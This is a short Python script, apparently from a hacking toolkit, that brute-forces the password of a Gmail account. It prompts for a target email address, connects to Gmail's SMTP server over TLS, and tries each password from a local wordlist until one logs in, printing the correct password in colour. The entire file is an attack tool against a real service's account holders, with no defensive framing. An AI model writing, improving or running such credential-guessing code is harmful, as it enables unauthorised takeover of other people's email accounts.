import smtplib
import signal

def smtp_gmail_brute():
	
	email=raw_input(">>>smtp>>>Enter email address:")
	print("[*] Connecting to Gmail Server")
	smtp_gmail=smtplib.SMTP("smtp.gmail.com",587)
	print("[*]Succesfully connected to Gmail Server")
	smtp_gmail.ehlo()
	print("[*]Creating a secure TLS channel")
	smtp_gmail.starttls()
	print("[*]Succesfully created a TLS channel")

	passfile=open("./password_lists/passwords.txt","r")

	for password in passfile.readlines():

		password=password.rstrip('\n')

		try:
			smtp_gmail.login(email,password)
			smtp_gmail=smtplib.SMTP("smtp.gmail.com",587)
        		smtp_gmail.ehlo()
        		smtp_gmail.starttls()
	
		except smtplib.SMTPAuthenticationError:
			print('\x1b[0;30;41m'+"[!]Incorrect password:%s" %password+'\x1b[0m')

		except KeyboardInterrupt:
			print("\nQuitting..")
			return

		else:
			print('\x1b[0;30;42m' + "[+]Correct password: %s" %password+'\x1b[0m')
			break


